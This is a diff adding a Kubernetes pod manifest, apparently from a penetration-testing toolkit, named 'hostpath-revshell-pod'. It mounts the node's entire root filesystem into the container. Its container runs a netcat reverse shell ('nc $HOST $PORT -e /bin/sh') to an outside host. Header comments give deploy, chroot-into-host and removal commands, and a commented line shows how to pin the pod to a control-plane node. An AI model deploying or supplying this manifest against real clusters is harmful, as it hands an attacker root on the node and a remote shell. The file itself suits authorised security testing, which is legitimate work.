@@ -1,0 +1,25 @@
+###########################################################
+## Deploy: kubectl -n [namespace] apply -f hostpath-revshell-pod.yaml 
+## Access: kubectl -n [namespace] exec -it hostpath-revshell-pod -- chroot /host
+## Remove: kubectl -n [namespace] delete hostpath-revshell-pod
+###########################################################
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostpath-revshell-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: hostpath-pod
+    image: busybox
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
